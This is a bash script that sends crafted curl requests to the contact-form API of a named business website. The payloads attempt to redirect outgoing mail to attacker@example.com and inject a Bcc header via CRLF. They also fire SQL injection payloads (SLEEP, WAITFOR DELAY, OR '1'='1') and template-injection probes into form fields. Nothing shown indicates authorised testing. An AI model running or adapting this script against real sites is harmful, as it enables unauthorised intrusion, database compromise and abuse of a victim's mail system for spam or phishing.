#!/bin/bash
UA="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0 Safari/537.36"
B=https://www.infinitycapital.bh
p () { local l="$1"; shift; echo "### $l"
  curl -sk -A "$UA" -H "Referer: $B/contact" -X POST "$B/api/send" "$@" -o /tmp/r.txt -w "code=%{http_code} size=%{size_download}\n"
  head -c 350 /tmp/r.txt; echo; echo; }

p "to_field_email"  -F "to=attacker@example.com" -F "subject=s" -F "msg=m"
p "to_json_str"     --data-urlencode "to=attacker@example.com"
p "targets_email"   -F "to=attacker@example.com" -F 'targets=["attacker@example.com"]' -F "subject=s" -F "msg=m"
p "targets_attacker" -F "fname=A" -F 'targets=["attacker@example.com"]' -F "subject=s" -F "msg=m" -F "check=1"
p "FULL_orig_fields" -F "fname=A" -F "lname=B" -F "areacode=973" -F "tel=1234567" -F "cname=C" -F "subject=s" -F "msg=m" -F "check=1" -F 'targets=["Consultation"]' -F "to=attacker@example.com"
p "SQLI_subj"       -F "to=attacker@example.com" -F "subject=x' AND SLEEP(5)-- -" -F "msg=m"
p "SQLI_msg"        -F "to=attacker@example.com" -F "subject=s" -F "msg=x' OR '1'='1"
p "SQLI_cname"      -F "to=attacker@example.com" -F "cname=x';WAITFOR DELAY '0:0:5'--" -F "subject=s" -F "msg=m"
p "SSTI_subject"    -F "to=attacker@example.com" -F 'subject={{7*7}}' -F 'msg=${7*7}<%= 7*7 %>'
p "CRLF_subj"       -F "to=attacker@example.com" -F "subject=a%0d%0aBcc:x@y.z" -F "msg=m"
p "HEADER_INJ_UserAgent" -F "to=attacker@example.com" -F "subject=s" -F "msg=m" -H "X-Forwarded-For: 10.0.0.1"
echo "=== response headers for a full-valid post ==="
curl -sk -A "$UA" -H "Referer: $B/contact" -X POST "$B/api/send" -F "to=attacker@example.com" -F "subject=s" -F "msg=m" -D - -o /dev/null | head -25
